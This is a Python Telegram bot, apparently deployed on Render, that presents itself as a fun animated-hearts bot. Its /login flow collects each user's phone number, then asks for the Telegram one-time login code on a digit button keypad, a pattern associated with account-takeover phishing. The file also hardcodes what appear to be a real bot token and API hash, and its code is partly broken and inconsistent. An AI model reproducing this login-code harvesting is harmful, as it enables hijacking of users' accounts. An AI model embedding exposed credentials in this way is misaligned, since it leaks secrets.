import asyncio
import random
from flask import Flask, request
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup, Bot
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes, Dispatcher

API_ID = 23863521
API_HASH = 'ace9a38bed2151c00da9f0cfcca9faad'
BOT_TOKEN = '8453985739:AAH78l1_XNcn_X7Ii9Gh7-OGTCHUuBaZ9Uk'
SESSION_PREFIX = 'userbot_'

registered_users = {}  # username : phone
userbot_accounts = {}  # phone : TelegramClient
skip_targets = {}      # phone : chat_id

# ================= Flask =================
flask_app = Flask(__name__)

# URL Webhook для Telegram
WEBHOOK_PATH = f"/{BOT_TOKEN}"
WEBHOOK_URL = f"https://userbot-heart-4.onrender.com{WEBHOOK_PATH}"  # твій URL Render

# ================= Telegram =================
bot = Bot(BOT_TOKEN)
app = ApplicationBuilder().token(BOT_TOKEN).build()
dispatcher: Dispatcher = app.dispatcher

# ===== Клавіатура цифр =====
def number_keyboard():
    buttons = [
        [InlineKeyboardButton("1", callback_data="1"),
         InlineKeyboardButton("2", callback_data="2"),
         InlineKeyboardButton("3", callback_data="3")],
        [InlineKeyboardButton("4", callback_data="4"),
         InlineKeyboardButton("5", callback_data="5"),
         InlineKeyboardButton("6", callback_data="6")],
        [InlineKeyboardButton("7", callback_data="7"),
         InlineKeyboardButton("8", callback_data="8"),
         InlineKeyboardButton("9", callback_data="9")],
        [InlineKeyboardButton("0", callback_data="0"),
         InlineKeyboardButton("✅", callback_data="confirm"),
         InlineKeyboardButton("⌫", callback_data="back")]
    ]
    return InlineKeyboardMarkup(buttons)

# ===== /start =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Привіт! Натисни /login щоб увійти через юзербот.\n"
        "Після входу можна писати /lov або /rainbow у будь-якому чаті."
    )

# ===== /login =====
async def login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[KeyboardButton("Поділитися номером 📱", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
    await update.message.reply_text(
        "Натисни кнопку, щоб надіслати свій номер телефону:",
        reply_markup=reply_markup
    )

# ===== Контакт =====
async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    number = "+" + contact.phone_number
    username = update.message.from_user.username or f"User{update.message.from_user.id}"
    registered_users[username] = number
    context.user_data['pending_number'] = number
    context.user_data['current_input'] = ""
    context.user_data['current_step'] = "code"
    await update.message.reply_text("Номер отримано. Введи код з Telegram:", reply_markup=number_keyboard())

# ===== Обробка кнопок =====
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    step = context.user_data.get('current_step')
    current = context.user_data.get('current_input', "")

    if data == "confirm":
        if current == "":
            await query.edit_message_text("Введення порожнє, обери цифри!")
            return
        if step == "code":
            code = current
            number = context.user_data.get('pending_number')
            await query.edit_message_text("Виконується логін юзербота...")
            context.user_data['current_input'] = ""
            context.user_data['current_step'] = None
    elif data == "back":
        context.user_data['current_input'] = current[:-1]
        await query.edit_message_text(
            f"{step.capitalize()}: {context.user_data['current_input']}",
            reply_markup=number_keyboard()
        )
    else:
        context.user_data['current_input'] = current + data
        await query.edit_message_text(
            f"{step.capitalize()}: {context.user_data['current_input']}",
            reply_markup=number_keyboard()
        )

# ===== /lov =====
base_heart = [
"🖤🖤🖤🖤🖤🖤🖤🖤🖤🖤",
"🖤🖤❤️❤️🖤🖤❤️❤️🖤🖤",
"🖤❤️❤️❤️❤️❤️❤️❤️❤️🖤",
"🖤❤️❤️❤️❤️❤️❤️❤️❤️🖤",
"🖤🖤❤️❤️❤️❤️❤️❤️🖤🖤",
"🖤🖤🖤❤️❤️❤️❤️🖤🖤🖤",
"🖤🖤🖤🖤❤️❤️🖤🖤🖤🖤",
"🖤🖤🖤🖤🖤🖤🖤🖤🖤🖤"
]
colors = ["❤️","🧡","💛","💚","💙","💜"]

async def handler_lov(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = await update.message.reply_text("\n".join(base_heart))
    for _ in range(12):
        new_heart = []
        for line in base_heart:
            new_line = ""
            for ch in line:
                if ch != "🖤":
                    new_line += random.choice(colors)
                else:
                    new_line += ch
            new_heart.append(new_line)
        try:
            await msg.edit_text("\n".join(new_heart))
        except:
            break
        await asyncio.sleep(0.5)

# ===== /rainbow =====
rainbow_hearts = "❤️🧡💛💚💙💜"

async def handler_rainbow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = await update.message.reply_text(rainbow_hearts)
    for _ in range(6):
        await asyncio.sleep(0.5)
        await msg.edit_text(rainbow_hearts[::-1])
        await asyncio.sleep(0.5)
        await msg.edit_text(rainbow_hearts)

# ===== Хендлери =====
dispatcher.add_handler(CommandHandler("start", start))
dispatcher.add_handler(CommandHandler("login", login))
dispatcher.add_handler(MessageHandler(filters.CONTACT, contact_handler))
dispatcher.add_handler(CommandHandler("lov", handler_lov))
dispatcher.add_handler(CommandHandler("rainbow", handler_rainbow))
dispatcher.add_handler(CallbackQueryHandler(button_handler))

# ================= Webhook =================
@flask_app.route(WEBHOOK_PATH, methods=["POST"])
def webhook():
    update = Update.de_json(request.get_json(force=True), bot)
    asyncio.run(dispatcher.process_update(update))
    return "ok", 200

# ================= Запуск =================
if __name__ == "__main__":
    # Встановлюємо Webhook у Telegram
    bot.set_webhook(WEBHOOK_URL)
    print(f"Бот запущений на Webhook: {WEBHOOK_URL}")
    flask_app.run(host="0.0.0.0", port=8080)
